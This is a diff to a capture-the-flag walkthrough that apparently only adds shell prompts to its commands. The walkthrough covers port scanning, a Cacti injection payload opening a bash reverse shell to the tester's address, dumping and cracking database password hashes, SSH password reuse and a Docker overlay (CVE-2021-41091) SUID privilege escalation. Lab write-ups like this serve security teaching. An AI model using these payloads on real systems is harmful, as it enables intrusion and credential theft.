@@ -26,8 +26,8 @@ Two ports:
 Wide scan first, then service detection on the open ports:
 
 ```bash
-nmap -p- --min-rate 10000 10.129.51.52
-nmap -p 22,80 -sCV 10.129.51.52
+$ nmap -p- --min-rate 10000 10.129.51.52
+$ nmap -p 22,80 -sCV 10.129.51.52
 ```
 
 ```
@@ -115,7 +115,7 @@ poller_id=1;bash -i >%26 /dev/tcp/10.10.14.6/443 0>%261
 With a listener waiting:
 
 ```bash
-nc -lnvp 443
+$ nc -lnvp 443
 ```
 
 ```
@@ -128,7 +128,7 @@ www-data@50bca5e748b0:/var/www/html$
 The shell is `www-data`, but the prompt hostname `50bca5e748b0` is a giveaway, and the rest confirms a Docker container, not the host:
 
 ```bash
-id
+$ id
 ```
 
 ```
@@ -136,8 +136,8 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
 ```bash
-ls -la /.dockerenv
-cat /proc/net/fib_trie
+$ ls -la /.dockerenv
+$ cat /proc/net/fib_trie
 ```
 
 `/.dockerenv` exists at the root, common tools like `ip`, `ifconfig`, and `ping` are missing, and `fib_trie` shows the container address `172.19.0.3`. linpeas later filled in the rest: full container ID `50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e`, seccomp enabled, AppArmor `docker-default` in enforce mode.
@@ -147,7 +147,7 @@ cat /proc/net/fib_trie
 Cacti's config holds the database connection, and it points at a separate container named `db`:
 
 ```bash
-cat /var/www/html/include/config.php
+$ cat /var/www/html/include/config.php
 ```
 
 ```php
@@ -162,7 +162,7 @@ $database_port     = '3306';
 From the Cacti container I reached the `db` host and dumped the `user_auth` table:
 
 ```bash
-mysql -h db -u root -proot cacti -e 'select username,password from user_auth;'
+$ mysql -h db -u root -proot cacti -e 'select username,password from user_auth;'
 ```
 
 ```
@@ -178,13 +178,13 @@ mysql -h db -u root -proot cacti -e 'select username,password from user_auth;'
 The `admin` and `marcus` rows are `$2y$` bcrypt at cost 10. I cracked marcus's hash with hashcat mode `3200`:
 
 ```bash
-hashcat -a 0 -m 3200 hash /usr/share/seclists/rockyou.txt
+$ hashcat -a 0 -m 3200 hash /usr/share/seclists/rockyou.txt
 ```
 
 It fell to `funkymonkey`. That password is reused for SSH on the actual host, so marcus on the host is a real account, not just a Cacti login:
 
 ```bash
-ssh marcus@10.129.51.52   # funkymonkey
+$ ssh marcus@10.129.51.52   # funkymonkey
 ```
 
 marcus owns the user flag in the home directory. The database creds also turn up in the `entrypoint.sh` of the Cacti image, which seeds the `cacti` schema with `root:root` on first boot, so the password is not a one-off, it is baked into the container build.
@@ -207,7 +207,7 @@ CVE-2021-41091 is the path. Docker Engine before 20.10.9 leaves the `/var/lib/do
 First I found the overlay path on the host with `mount`:
 
 ```bash
-mount | grep overlay
+$ mount | grep overlay
 ```
 
 ```
@@ -217,7 +217,7 @@ overlay on /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad63252
 The container shell was still `www-data`, but the container ships with enough capabilities (`cap_setuid`, `cap_setgid`) that `capsh` jumps straight to root inside the container, no kernel exploit needed. `/sbin/capsh` is even SUID in the container. This is the GTFOBins technique:
 
 ```bash
-capsh --gid=0 --uid=0 --
+$ capsh --gid=0 --uid=0 --
 ```
 
 ```
@@ -227,14 +227,14 @@ root@50bca5e748b0:/tmp#
 Now root inside the container, I copied bash out and set it SUID so the bit is explicit and the binary is mine, not the system one:
 
 ```bash
-cp /bin/bash /tmp/0xdf
-chmod 4777 /tmp/0xdf
+$ cp /bin/bash /tmp/0xdf
+$ chmod 4777 /tmp/0xdf
 ```
 
 Back on the host as marcus, that same binary now sits SUID root under the container's merged path. Running it with `-p` keeps the effective UID instead of dropping privileges the way bash normally does for SUID:
 
 ```bash
-/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/tmp/0xdf -p
+$ /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/tmp/0xdf -p
 ```
 
 ```
